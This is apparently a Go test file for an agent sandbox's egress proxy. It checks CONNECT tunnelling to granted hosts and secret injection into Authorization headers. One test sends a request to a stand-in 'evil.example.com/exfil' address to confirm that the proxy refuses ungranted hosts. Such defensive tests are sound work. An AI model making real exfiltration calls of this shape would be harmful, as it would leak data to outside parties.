package capd

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"testing"

	"github.com/parkinsons0to1/AgentOS/internal/spec"
)

// proxyClient returns an http.Client that routes through the gateway like an
// unmodified tool honoring HTTPS_PROXY would.
func proxyClient(t *testing.T, gatewayURL string) *http.Client {
	t.Helper()
	proxy, err := url.Parse(gatewayURL)
	if err != nil {
		t.Fatal(err)
	}
	return &http.Client{Transport: &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // self-signed test upstream
	}}
}

func TestConnectTunnelsGrantedHost(t *testing.T) {
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "tls-ok")
	}))
	defer upstream.Close()

	sess := &spec.Session{
		Name:    "t",
		Runtime: spec.Runtime{Command: []string{"true"}},
		// httptest TLS servers listen on 127.0.0.1.
		Egress: []spec.Grant{{Host: "127.0.0.1"}},
	}
	base, _ := testGateway(t, sess, NewSecrets(nil))

	resp, err := proxyClient(t, base).Get(upstream.URL)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK || string(body) != "tls-ok" {
		t.Fatalf("via CONNECT: status=%d body=%q", resp.StatusCode, body)
	}
}

func TestConnectDeniesUngrantedHost(t *testing.T) {
	sess := &spec.Session{Name: "t", Runtime: spec.Runtime{Command: []string{"true"}}}
	base, _ := testGateway(t, sess, NewSecrets(nil))

	// No dial should ever happen; the proxy must refuse the CONNECT itself.
	_, err := proxyClient(t, base).Get("https://evil.example.com/exfil")
	if err == nil {
		t.Fatal("CONNECT to ungranted host must fail")
	}
}

func TestAbsoluteURIProxyInjectsSecret(t *testing.T) {
	var gotAuth string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		io.WriteString(w, "ok")
	}))
	defer upstream.Close()

	sess := &spec.Session{
		Name:    "t",
		Runtime: spec.Runtime{Command: []string{"true"}},
		Egress: []spec.Grant{{
			Host:     "api.example.com",
			Secret:   "tok",
			Inject:   &spec.Inject{Header: "Authorization", Format: "Bearer {secret}"},
			Upstream: upstream.URL,
		}},
	}
	base, _ := testGateway(t, sess, NewSecrets(map[string]string{"tok": "plain-http-secret"}))

	// Plain-HTTP absolute-URI request through the proxy, as HTTP_PROXY tools send.
	resp, err := proxyClient(t, base).Get("http://api.example.com/v1/data")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	if gotAuth != "Bearer plain-http-secret" {
		t.Fatalf("Authorization = %q, want injected bearer", gotAuth)
	}
}
